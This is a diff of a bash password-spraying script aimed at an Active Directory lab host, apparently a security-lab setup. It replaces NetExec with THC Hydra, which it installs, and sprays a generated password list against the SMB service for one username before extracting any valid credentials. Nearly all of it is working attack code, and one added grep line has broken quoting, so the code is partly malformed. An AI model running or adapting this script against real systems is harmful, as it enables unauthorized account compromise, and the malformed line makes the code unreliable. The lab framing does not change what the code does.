@@ -1,6 +1,6 @@
 #!/bin/bash
 # Password Spraying Script for AD Lab
-# Uses NetExec (nxc) for SMB password spraying
+# Uses THC Hydra for SMB password spraying
 # WARNING: For authorized testing only!
 
 set -e
@@ -16,7 +16,7 @@ NC='\033[0m'
 TARGET_IP="192.168.56.102"
 TARGET_DOMAIN="windomain.local"
 PASSWORD_LIST="/tmp/passwordlist"
-USER_LIST="/tmp/userlist"
+USERNAME="vagrant"
 
 # Create default password list if it doesn't exist
 if [ ! -f "$PASSWORD_LIST" ]; then
@@ -69,72 +69,47 @@ EOF
     echo -e "${GREEN}[+] Password list created at $PASSWORD_LIST${NC}"
 fi
 
-# Create default user list if it doesn't exist
-if [ ! -f "$USER_LIST" ]; then
-    echo -e "${CYAN}[*] Creating default user list...${NC}"
-    cat > "$USER_LIST" << 'EOF'
-administrator
-admin
-vagrant
-guest
-krbtgt
-EOF
-    echo -e "${GREEN}[+] User list created at $USER_LIST${NC}"
-fi
-
 echo -e "${CYAN}========================================${NC}"
 echo -e "${CYAN}  Password Spraying Script              ${NC}"
 echo -e "${CYAN}  Target: $TARGET_IP                   ${NC}"
+echo -e "${CYAN}  Username: $USERNAME                  ${NC}"
 echo -e "${CYAN}========================================${NC}"
 echo ""
 
-# Check if netexec is installed
-if ! command -v nxc &> /dev/null; then
-    echo -e "${YELLOW}[!] NetExec (nxc) not found. Attempting to install...${NC}"
-    
-    # Try to install via pip
-    if command -v pip3 &> /dev/null; then
-        pip3 install netexec
-    elif command -v pip &> /dev/null; then
-        pip install netexec
-    else
-        echo -e "${RED}[!] pip not found. Please install NetExec manually:${NC}"
-        echo "    pip3 install netexec"
-        echo "    or"
-        echo "    apt install netexec"
-        exit 1
-    fi
+# Check if hydra is installed
+if ! command -v hydra &> /dev/null; then
+    echo -e "${YELLOW}[!] Hydra not found. Attempting to install...${NC}"
+    apt-get update && apt-get install -y hydra
 fi
 
 echo -e "${YELLOW}[Phase 1] SMB Password Spray${NC}"
 echo "----------------------------------------"
 echo -e "${CYAN}[*] Spraying passwords against SMB service...${NC}"
-echo -e "${CYAN}    Users: $(wc -l < $USER_LIST)${NC}"
+echo -e "${CYAN}    User: $USERNAME${NC}"
 echo -e "${CYAN}    Passwords: $(wc -l < $PASSWORD_LIST)${NC}"
 echo ""
 
-# Run NetExec SMB password spray
-# -u: username or userlist
-# -p: password or passwordlist
-# --continue-on-success: keep going even after finding valid creds
-nxc smb "$TARGET_IP" -u "$USER_LIST" -p "$PASSWORD_LIST" --continue-on-success 2>&1 | tee "/tmp/spray_results_$(date +%Y%m%d_%H%M%S).txt"
+# Run Hydra SMB password spray
+# -l: single username
+# -P: password list file
+# smb://target: target protocol and IP address
+hydra -l "$USERNAME" -P "$PASSWORD_LIST" smb://"$TARGET_IP" 2>&1 | tee "/tmp/spray_results_$(date +%Y%m%d_%H%M%S).txt"
 
 echo ""
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}  Password Spray Complete!              ${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo ""
-echo -e "${YELLOW}Review the output above for [+] indicators.${NC}"
-echo -e "${YELLOW}Successful credentials will be marked with [+]${NC}"
+echo -e "${YELLOW}Review the output above for valid credentials.${NC}"
 echo ""
 
 # Extract valid credentials from results
-echo -e "${CYAN}[*] Extracting successful authentications...${NC}"
-if grep -q "\[+]" "/tmp/spray_results_"*.txt 2>/dev/null; then
-    echo -e "${GREEN}[+] Valid credentials found:${NC}"
-    grep "\[+]" "/tmp/spray_results_"*.txt | grep -v "SMB" | tail -5
+echo -e "${CYAN}[*] Checking for successful authentications...${NC}"
+if grep -q "login:\|password:\|SUCCESS\|host:\" "/tmp/spray_results_"*.txt 2>/dev/null; then
+    echo -e "${GREEN}[+] Valid credentials may have been found.${NC}"
+    grep -E "login:|password:|host:" "/tmp/spray_results_"*.txt | tail -10
 else
-    echo -e "${YELLOW}[!] No successful authentications found with current wordlist.${NC}"
+    echo -e "${YELLOW}[!] Review the output manually for results.${NC}"
 fi
 
 echo ""
